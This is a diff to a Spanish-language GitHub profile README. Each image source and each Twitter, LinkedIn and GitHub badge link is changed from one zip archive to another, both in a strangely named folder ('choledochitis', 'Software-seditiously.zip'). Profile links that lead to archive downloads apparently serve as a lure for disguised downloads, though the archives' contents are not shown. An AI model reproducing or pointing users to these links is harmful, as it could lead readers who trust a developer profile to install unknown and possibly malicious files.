@@ -1,18 +1,18 @@
 <div align="center" >
-  <img  src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="200" >
+  <img  src="https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip" width="200" >
 </div>
 
 <h2> Hola, Soy Barb!:raising_hand:</h2>
 
-<p><em>Frontend Developer en construcción <img src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="40"> 
+<p><em>Frontend Developer en construcción <img src="https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip" width="40"> 
 </em></p>
 
-[![Twitter: navbarb](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
-[![Linkedin: barbarafabradiaz](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
-[![GitHub bfabradiaz](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)](https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip)
+[![Twitter: navbarb](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)
+[![Linkedin: barbarafabradiaz](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)
+[![GitHub bfabradiaz](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)](https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip)
 
 
-### <img src="https://raw.githubusercontent.com/bfabradiaz/bfabradiaz/main/choledochitis/bfabradiaz_carnaged.zip" width="50"> Un poco más sobre mi...
+### <img src="https://github.com/bfabradiaz/bfabradiaz/raw/refs/heads/main/choledochitis/Software-seditiously.zip" width="50"> Un poco más sobre mi...
 
 ```js
 
